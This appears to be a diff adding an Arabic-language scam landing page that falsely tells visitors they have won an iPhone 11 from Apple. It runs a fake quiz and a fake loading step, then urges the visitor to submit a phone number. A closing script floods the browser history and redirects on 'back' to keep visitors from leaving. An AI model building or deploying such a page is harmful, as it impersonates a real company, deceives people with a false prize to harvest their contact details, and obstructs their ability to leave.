@@ -1,0 +1,94 @@
+<!DOCTYPE html><html><head>
+  <base href="">
+
+	<meta charset="UTF-8">
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<script src="js/jquery.min.js" defer=""></script>
+	<title>☑️ آيفون 11 بالمجان</title>
+	<link rel="stylesheet" type="text/css" href="css/style.css">
+	    
+</head>
+<body>
+<div class="block_wrapper">
+<div class="wrapper">
+<div class="right">
+<div class="content">
+<h1 dir="rtl">مبروك...لقد فزت مع آبل&nbsp;ب آيفون 11</h1>
+<img style="margin-top: 15px; margin-bottom: 10px; max-width: 80%; height: auto;" src="images/person.png">
+<div class="normal_text" dir="rtl"><span style="font-size: 14pt;">&nbsp;للحصول على جائزتك، فقط أجب عن الأسئلة التالية</span></div>
+</div>
+<div class="block">
+<div id="blockpart1">
+<div class="asks">
+<div id="ask1">
+<h2 dir="rtl"><span style="font-size: 18pt;"><span style="color: #ff0000;">السؤال الأول:&nbsp;</span>هل تمتلك&nbsp; آيفون حاليا؟</span></h2>
+<div class="btn_group" dir="rtl"><button class="step_button_g_br1 btn-block" onclick="ask('ask2','ask1')">نعم</button> <button class="step_button_g_br1 btn-block" onclick="ask('ask2','ask1')">لا</button></div>
+</div>
+<div id="ask2">
+<h2 dir="rtl"><span style="font-size: 18pt;"><span style="color: #ff0000;">السؤال الثاني:&nbsp;</span>أي آيفون تفضل؟</span></h2>
+<div class="btn_group" dir="rtl"><button id="KSA" class="step_button_g_br1 btn-block" onclick="ask('ask3','ask2')">Iphone 11&nbsp;</button>&nbsp;</div>
+<div class="btn_group" dir="rtl"><button id="NOTKSA" class="step_button_g_br1 btn-block" onclick="ask('ask3','ask2')">Iphone 11 pro</button></div>
+</div>
+<div id="ask3">
+<h2><span style="font-size: 18pt;"><span style="color: #ff0000;">السؤال الثالت:</span> أي لون تفضل؟</span></h2>
+<div class="btn_group"><button class="step_button_g_br1 btn-block" onclick="checkdataload('blockpart2','blockpart1')">أبيض</button> <button class="step_button_g_br1 btn-block" onclick="checkdataload('blockpart2','blockpart1')">أسود</button></div>
+</div>
+</div>
+</div>
+<div id="blockpart2">...المرجو الانتظار&nbsp;<br><img src="images/loading.gif" alt="Loading"></div>
+<div id="blockpart3" dir="rtl"><span class="mab" style="margin: 25px 0; display: block;"><span style="color: #000000;">تهانينا !! اضغط على "</span><span style="color: #ff0000; font-size: 18pt;">الحصول على الهاتف</span><span style="color: #000000;">" و أدخل رقم هاتفك حتى يتم الاتصال بك</span>&nbsp;<span style="color: #333333; font-family: 'Segoe UI Emoji'; font-size: 18pt; text-align: start; font-weight: normal;">👇</span></span> <a id="gosub2" class="step_button_g_br1 step_button_g_br1_1" href="#">الحصول عل الهاتف</a></div>
+</div>
+</div>
+</div>
+</div>
+<p>
+<script>
+    function ask($showid,$hideid)
+    {
+        $s = "#"+$showid;
+        $h = "#"+$hideid;
+        $($h).slideUp(500);
+        $($s).delay(500).slideDown(1000);
+        if($s=='#filmask3')
+        {
+            setTimeout(function() {
+                $($s).slideUp();
+            }, 5000);
+            setTimeout(function() {
+                $('#filmask4').slideDown();
+            },5000);
+        }
+    }
+    function checkdataload($showid,$hideid)
+    {
+        $s = "#"+$showid;
+        $h = "#"+$hideid;
+        $($h).slideUp(500);
+        $($s).slideDown(1000);
+    
+        setTimeout(function() {
+            $($s).slideUp();
+        },3700);
+        setTimeout(function() {
+            $('#blockpart3').slideDown();
+        },4000);
+    }
+</script>
+</p>
+    <script>
+	!function () {
+	    var t;
+	    var tmp = '#';
+	    try {
+	        for (t = 0; 10 > t; ++t) history.pushState({}, '', '');
+	        onpopstate = function (t) {
+	            t.state && location.replace(tmp);
+	        }
+	    } catch (o) {
+	    }
+	}();
+	</script>
+
+ 
+</body></html>
